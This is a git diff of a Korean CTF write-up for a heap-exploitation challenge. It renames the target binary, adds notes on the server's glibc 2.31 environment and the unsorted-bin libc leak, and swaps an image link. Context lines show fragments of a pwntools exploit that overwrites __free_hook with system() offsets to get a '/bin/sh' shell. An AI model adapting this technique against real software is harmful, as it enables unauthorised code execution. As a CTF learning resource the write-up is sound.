@@ -29,7 +29,7 @@
 ```python
 from pwn import *
 
-r = process("./give_me_A+")
+r = process("./give_me_A_plus")
 
 def add(name, age, number_of_subjects):
     r.sendlineafter("[+] input menu.\n", 'a')
@@ -58,7 +58,7 @@ def modify(index):
 
 ### libc leak
 
-unsorted bin에 가장 먼저 들어간 청크의 bk와, 가장 나중에 들어간 청크의 fd에는 `main_arena`의 주소가 저장된다. 저장되는 주소의 오프셋은 libc 버전마다 조금씩 다르다. 이 값을 뽑아내면 libc base를 알아낼 수 있다.
+unsorted bin에 가장 먼저 들어간 청크의 bk와, 가장 나중에 들어간 청크의 fd에는 `main_arena`의 주소가 저장된다. 저장되는 주소의 오프셋은 libc 버전마다 조금씩 다르다. 이 값을 뽑아내면 libc base를 알아낼 수 있고, offset을 이용하여 libc 버전도 알 수 있다. (서버는 glibc 2.31 버전을 사용하는 Ubuntu 20.04 환경이다.)
 
 <br>
 
@@ -156,7 +156,7 @@ delete(1) # system("/bin/sh")
 ```python
 from pwn import *
 
-r = process("./give_me_A+")
+r = process("./give_me_A_plus")
 
 offset_freehook = 0x1eeb28 # offset of free hook from libc base
 offset_system = 0x55410 # offset of system() from libc base
@@ -239,4 +239,4 @@ delete(1) # system("/bin/sh")
 r.interactive()
 ```
 
-![image](https://user-images.githubusercontent.com/59759771/96178600-9115b100-0f6a-11eb-90e3-3007e72f0fbb.png)
+![image](https://user-images.githubusercontent.com/59759771/96178367-43994400-0f6a-11eb-9c21-3a1b7ac81934.png)
